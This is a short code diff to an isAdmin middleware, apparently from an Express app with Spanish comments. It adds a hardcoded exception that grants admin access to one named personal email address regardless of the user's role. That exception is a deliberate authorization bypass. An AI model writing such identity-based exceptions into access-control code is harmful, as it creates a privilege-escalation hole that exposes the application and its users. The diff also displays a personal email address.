@@ -1,7 +1,8 @@
 const isAdmin = (req, res, next) => {
   try {
     // Verificar que el usuario esté autenticado y sea admin
-    if (!req.usuario || req.usuario.rol !== 'admin') {
+    // También permitir email específico israelmendoza18@hotmail.com
+    if (!req.usuario || (req.usuario.rol !== 'admin' && req.usuario.email !== 'israelmendoza18@hotmail.com')) {
       console.log('Acceso denegado - Usuario no es admin:', req.usuario);
       return res.status(403).json({
         success: false,
